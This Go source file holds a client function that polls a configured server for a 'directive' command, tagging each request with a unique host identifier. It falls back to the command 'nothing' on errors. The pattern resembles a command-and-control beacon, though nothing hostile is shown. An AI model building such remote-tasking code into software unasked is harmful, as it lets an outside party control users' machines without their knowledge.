package crossplatform

import (
	c "corpotecht_client/common"
	"corpotecht_client/config"
	"corpotecht_client/utils"
	"encoding/json"
	"net/http"
)

func GetDirective() c.Directive {
	fallback := c.Directive{
		Command: "nothing",
	}
	var directive c.Directive
	client := &http.Client{}
	req, err := http.NewRequest("GET", config.GetDirectiveEndpoint, nil)
	if err != nil {
		utils.DebugLog("Failed to connect.")
		return fallback
	}
	req.Header.Add("Identifier", utils.GetUniqueIdentifier())
	resp, err := client.Do(req)
	if err != nil {
		utils.DebugLog("Failed to connect.")
		return fallback
	}
	err = json.NewDecoder(resp.Body).Decode(&directive)
	if err != nil {
		utils.DebugLog("Failed to connect or parse JSON.")
		return fallback
	}
	return directive

}
